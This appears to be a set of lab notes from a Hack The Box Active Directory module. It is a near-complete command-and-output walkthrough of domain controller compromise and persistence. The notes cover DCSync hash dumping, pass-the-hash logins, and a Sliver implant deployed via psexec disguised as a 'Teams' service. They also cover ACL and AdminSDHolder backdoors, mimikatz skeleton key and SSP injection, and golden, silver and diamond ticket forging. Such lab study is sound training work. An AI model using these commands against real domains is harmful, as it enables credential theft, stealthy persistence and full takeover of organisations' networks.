### DCSync

```sh
3kjS@htb[/htb]$ proxychains -q netexec ldap 172.16.1.15 -u websec mobilesec -p spongebob --continue-on-success
SMB         172.16.1.15     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:child.htb.local) (signing:True) (SMBv1:False)
LDAP        172.16.1.15     389    DC01             [+] child.htb.local\websec:spongebob 
LDAP        172.16.1.15     389    DC01             [+] child.htb.local\mobilesec:spongebob
```

![](Domain%20Controller%20Compromise-20261118-132555.png)

```sh
3kjS@htb[/htb]$ proxychains impacket-secretsdump -just-dc mobilesec:spongebob@172.16.1.15 | grep -i child.htb.local
```

```sh
3kjS@htb[/htb]$ wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
```
#### Method 1: Rubeus

```sh
sliver (http) > rubeus -- asktgt /user:Administrator /d:child.htb.local /rc4:e7d6a507876e2c8b7534143c1c6f28ba /ptt
```

Subsequently, we can query the resources on `dc01.child.htb.local` to verify that the Kerberos ticket has successfully been injected into memory.

```sh
sliver (http) > ls //dc01.child.htb.local/c$
```

```sh
sliver (http) > pivots tcp

[*] Started tcp pivot listener :9898 with id 1

sliver (http) > generate --format service -i 172.16.1.11:9898 --skip-symbols -N psexec-pivot

[*] Generating new windows/amd64 implant binary
[!] Symbol obfuscation is disabled
[*] Build completed in 2s
[*] Implant saved to /home/htb-ac-1008/psexec-pivot.exe

sliver (http) > psexec --custom-exe psexec-pivot.exe --service-name Teams --service-description MicrosoftTeaams dc01.child.htb.local

[*] Uploaded service binary to \\dc01.child.htb.local\C$\windows\temp\5-CONVERT-7ot.exe
[*] Waiting a bit for the file to be analyzed ...
[*] Successfully started service on dc01.child.htb.local (c:\windows\temp\5-CONVERT-7ot.exe)
[*] Successfully removed service Teams on dc01.child.htb.local

[*] Session 9fccdeae psexec-pivot - 10.129.205.234:49713->http-> (dc01) - windows/amd64 - Thu, 16 May 2024 06:44:15 BST
```

```sh
sliver (http) > use 9fccdeae-2501-4770-806b-50be66c2f623

[*] Active session psexec-pivot (9fccdeae-2501-4770-806b-50be66c2f623)

sliver (psexec-pivot) > info

        Session ID: 9fccdeae-2501-4770-806b-50be66c2f623
              Name: psexec-pivot
          Hostname: dc01
              UUID: 361e3942-bc59-828d-e359-d7c231ba05b2
          Username: NT AUTHORITY\SYSTEM
               UID: S-1-5-18
               GID: S-1-5-18
               PID: 3760
                OS: windows
           Version: Server 2016 build 17763 x86_64
            Locale: en-US
              Arch: amd64
         Active C2: 
    Remote Address: 10.129.205.234:49713->http->
         Proxy URL: 
Reconnect Interval: 1m0s
     First Contact: Thu May 16 06:44:15 BST 2024 (5m6s ago)
      Last Checkin: Thu May 16 06:49:15 BST 2024 (6s ago)

sliver (psexec-pivot) > sharpview -- 'Add-DomainObjectAcl  -PrincipalIdentity svc_sql -Rights DCSync'
```

Right after, we have made the change, we are going to proceed to verify it by using [secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) from Impacket.

```sh
3kjS@htb[/htb]$ proxychains impacket-secretsdump -just-dc 'svc_sql:jkhnrjk123!'@172.16.1.15 | grep -i :::
```
### Method 2: Evil-WinRM

```sh
3kjS@htb[/htb]$ proxychains evil-winrm -i 172.16.1.15 -u Administrator -H e7d6a507876e2c8b7534143c1c6f28ba -s .
```

```sh
*Evil-WinRM* PS C:\Users\Administrator\Documents> Add-DomainObjectAcl  -PrincipalIdentity svc_sql -Rights DCSync 
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.15:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.15:5985  ...  OK
```

We can verify `svc_sql`'s permission by utilizing [secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py), and upon inspection, it becomes evident that the user `svc_sql` possesses DCSync permission.

```sh
3kjS@htb[/htb]$ proxychains impacket-secretsdump -just-dc 'svc_sql:jkhnrjk123!'@172.16.1.15 | grep -i :::
```
### AdminSDHolder

```sh
*Evil-WinRM* PS C:\Users\Administrator\Documents> Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=child,DC=htb,DC=local" -PrincipalIdentity eric -Rights All
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.15:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.15:5985  ...  OK
```

![](Domain%20Controller%20Compromise-20261118-133153.png)
### Skeleton Key

```sh
*Evil-WinRM* PS C:\Users\Administrator\Documents> upload mimikatz.exe 
Info: Uploading mimikatz.exe to C:\Users\Administrator\Documents\mimikatz.exe
```

```sh
*Evil-WinRM* PS C:\Users\Administrator\Documents> .\mimikatz.exe "privilege::debug" "misc::skeleton" "exit"
mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # misc::skeleton
[KDC] data
[KDC] struct
[KDC] keys patch OK
[RC4] functions
[RC4] init patch OK
[RC4] decrypt patch OK

mimikatz(commandline) # exit
Bye!
```
### Malicious SSP

```cmd
Authentication Id : 0 ; 221758 (00000000:0003623e)
Session           : Interactive from 1
User Name         : Administrator
Domain            : CHILD
Logon Server      : DC01
Logon Time        : 1/18/2023 7:26:14 PM
SID               : S-1-5-21-2749819870-3967162335-1946002573-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : CHILD
         * NTLM     : e7d6a507876e2c8b7534143c1c6f28ba
         * SHA1     : f879290122531be79264e1d8317f6b61c7266eca
         * DPAPI    : 3c9427e7a985cd448abd9f3f93dfff9e
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : CHILD
         * Password : (null)
        kerberos :
         * Username : administrator
         * Domain   : CHILD.HTB.LOCAL
         * Password : (null)
        ssp :
        credman :
```

We can backdoor a custom SSP by executing the command `misc::memssp` in the mimikatz command line.

```cmd
mimikatz # misc::memssp
Injected =)
```
### ACL Persistence

In the previous section, we discussed some common DACL exploitation; we abused them to escalate our privilege in the domain. However, we can also abuse DACL to maintain our access. The ways are countless, and the principle behind them is simple: helping us compromise privileged domain principals again quickly. Some examples:

- Grant a low-privileged user with WinRM access to the domain controller
- Grant a low-privileged user with Remote Desktop access to the domain controller
- Grant a low-privileged user with WMI access to the domain controller
- Write permission on a certificate template
- DCSync backdoor
- LAPS backdoor
### Golden Ticket

```sh
*Evil-WinRM* PS C:\Users\Administrator\Documents> .\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:child\krbtgt" "exit"
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.15:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.15:5985  ...  OK

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # lsadump::dcsync /user:child\krbtgt
[DC] 'child.htb.local' will be the domain
[DC] 'dc01.child.htb.local' will be the DC server
[DC] 'child\krbtgt' will be the user account

Object RDN           : krbtgt

<SNIP>

* Primary:Kerberos-Newer-Keys *
    Default Salt : CHILD.HTB.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : f2a363997e7539b83637c12d872600a2b4c2727f2ebd35229d33dd85bdc11ed8
      aes128_hmac       (4096) : c6eee931cc438dd709d1bcef7594b343
      des_cbc_md5       (4096) : ba7013d3fe2c67d0
<SNIP>
      
*Evil-WinRM* PS C:\Users\Administrator\Documents> .\mimikatz.exe "kerberos::golden /user:Administrator /domain:child.htb.local /sid:S-1-5-21-2749819870-3967162335-1946002573 /aes256:f2a363997e7539b83637c12d872600a2b4c2727f2ebd35229d33dd85bdc11ed8 /startoffset:0 /endin:600 /renewmax:10080 /ticket:golden.kirbi" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # kerberos::golden /user:Administrator /domain:child.htb.local /sid:S-1-5-21-2749819870-3967162335-1946002573 /aes256:f2a363997e7539b83637c12d872600a2b4c2727f2ebd35229d33dd85bdc11ed8 /startoffset:0 /endin:600 /renewmax:10080 /ticket:golden.kirbi
User      : Administrator
Domain    : child.htb.local (CHILD)
SID       : S-1-5-21-2749819870-3967162335-1946002573
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: f2a363997e7539b83637c12d872600a2b4c2727f2ebd35229d33dd85bdc11ed8 - aes256_hmac
Lifetime  : 11/28/2023 12:51:35 PM ; 11/28/2023 10:51:35 PM ; 12/5/2023 12:51:35 PM
-> Ticket : golden.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !

mimikatz(commandline) # exit
Bye!
```
### Silver Ticket

```sh
*Evil-WinRM* PS C:\Users\Administrator\Documents> .\mimikatz.exe "kerberos::golden /user:Administrator /domain:child.htb.local /sid:S-1-5-21-2749819870-3967162335-1946002573 /target:srv01 /service:cifs /aes256:b358beae56d68a3713ac6ff800bfe60826444233f8bc9b1cbd7d0352405fab8f /startoffset:0 /endin:600 /renewmax:10080 /ticket:silver.kirbi" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # kerberos::golden /user:Administrator /domain:child.htb.local /sid:S-1-5-21-2749819870-3967162335-1946002573 /target:srv01 /service:cifs /aes256:b358beae56d68a3713ac6ff800bfe60826444233f8bc9b1cbd7d0352405fab8f /startoffset:0 /endin:600 /renewmax:10080 /ticket:silver.kirbi
User      : Administrator
Domain    : child.htb.local (CHILD)
SID       : S-1-5-21-2749819870-3967162335-1946002573
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: b358beae56d68a3713ac6ff800bfe60826444233f8bc9b1cbd7d0352405fab8f - aes256_hmac
Service   : cifs
Target    : srv01
Lifetime  : 11/28/2023 1:33:27 PM ; 11/28/2023 11:33:27 PM ; 12/5/2023 1:33:27 PM
-> Ticket : silver.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !

mimikatz(commandline) # exit
Bye!
```

| Access Type       | Service    |
| ----------------- | ---------- |
| `PsExec`          | cifs       |
| `WMI`             | HOST RPCSS |
| `WinRM`           | HOST HTTP  |
| `Scheduled Tasks` | HOST       |
### Diamond Ticket

```sh
sliver (http-beacon) > execute-assembly /home/htb-ac-1008/Rubeus.exe diamond /tgtdeleg /ticketuser:carrot /ticketuserid:1114 /group:512 /krbkey:f2a363997e7539b83637c12d872600a2b4c2727f2ebd35229d33dd85bdc11ed8 /nowrap
```
